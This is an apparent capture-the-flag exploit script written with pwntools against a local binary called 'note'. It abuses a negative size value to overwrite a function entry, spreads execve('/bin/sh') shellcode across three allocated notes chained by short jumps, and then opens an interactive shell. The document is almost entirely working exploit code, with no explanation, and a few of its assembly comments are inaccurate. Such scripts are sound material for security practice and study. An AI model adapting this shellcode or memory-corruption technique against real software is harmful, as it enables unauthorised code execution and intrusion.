from pwn import *
p=process('./note')
context(arch='amd64',log_level='debug',os='linux')

sl=lambda s:p.sendline(s)
ru=lambda s:p.recvuntil(s)
sd=lambda s:p.recvuntil(s)

def add(idx_string,size_string,shellcode):
	sleep(0.5)
	sl('1')
	sleep(0.5)
	sl(idx_string)
	sleep(0.5)
	sl(size_string)
	sleep(0.5)
	sl(shellcode)

ru('#          404 not found                 \n')
from struct import pack
sub=pack('<i',-13)
payload='13'.ljust(10,'\x00')+sub            # over the close()
shellcode=asm('mov rax,0x068732f6e69622f')+'\xeb\x14'
add('0',payload,shellcode)

shellcode='\x50'    # push rax
shellcode+='\x48\x89\xe7' # mov rdi,rsp
shellcode+='\x31\xc0'     # mov eax,eax
shellcode=shellcode.ljust(10,'\x90')+'\xeb\x14'
add('1','13',shellcode)

shellcode='\xb0\x3b' # mov al,59
shellcode+='\x31\xf6' # xor esi,esi
shellcode+='\x31\xd2' # xor edx,edx
shellcode+='\x0f\x05' # syscall
add('2','13',shellcode)

sl('2')


p.interactive()